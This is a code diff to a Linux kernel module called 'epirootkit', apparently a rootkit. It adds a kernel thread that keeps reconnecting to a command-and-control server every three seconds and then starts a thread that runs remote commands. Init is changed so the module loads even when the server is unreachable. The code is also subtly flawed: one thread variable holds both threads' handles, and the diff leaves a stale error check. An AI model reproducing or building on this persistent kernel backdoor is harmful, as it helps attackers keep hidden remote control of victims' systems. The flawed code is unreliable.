@@ -198,6 +198,29 @@ static int command_loop(void *data) {
     return 0;
 }
 
+static int connection_loop(void *data) {
+    while (!kthread_should_stop()) {
+        if (!g_sock) {
+            pr_info("epirootkit: trying to connect to C2...\n");
+            if (connect_to_c2_server() == 0) {
+                notify_connection_state(1);
+                pr_info("epirootkit: launching command_loop\n");
+                g_thread = kthread_run(command_loop, NULL, "rk_cmd");
+                if (IS_ERR(g_thread)) {
+                    pr_err("epirootkit: command_loop failed\n");
+                    g_thread = NULL;
+                    sock_release(g_sock);
+                    g_sock = NULL;
+                    notify_connection_state(0);
+                }
+            }
+        }
+        msleep(3000); // on va dormir 3 secondes avant de réessayer
+    }
+    return 0;
+}
+
+
 
 static int __init epirootkit_init(void) {
     int err;
@@ -209,13 +232,12 @@ static int __init epirootkit_init(void) {
     connection_state = 0;
     prev_module = NULL;
 
-    err = connect_to_c2_server();
-    if (err < 0) {
-        pr_err("epirootkit: Failed to connect to C2 server\n");
-        return err;
-    }
+    g_thread = kthread_run(connection_loop, NULL, "rk_conn");
+if (IS_ERR(g_thread)) {
+    pr_err("epirootkit: Failed to start connection_loop\n");
+    return PTR_ERR(g_thread);
+}
 
-    g_thread = kthread_run(command_loop, NULL, "rk");
     if (IS_ERR(g_thread)) {
         pr_err("epirootkit: Failed to create command thread\n");
         sock_release(g_sock);
@@ -232,10 +254,10 @@ static void __exit epirootkit_exit(void) {
     pr_info("epirootkit: Cleaning up module...\n");
 
     if (g_thread) {
-        pr_info("epirootkit: Stopping thread...\n");
-        kthread_stop(g_thread);
-        g_thread = NULL;
-    }
+    pr_info("epirootkit: Stopping thread...\n");
+    kthread_stop(g_thread);
+    g_thread = NULL;
+}
 
     if (g_sock) {
         pr_info("epirootkit: Closing socket...\n");
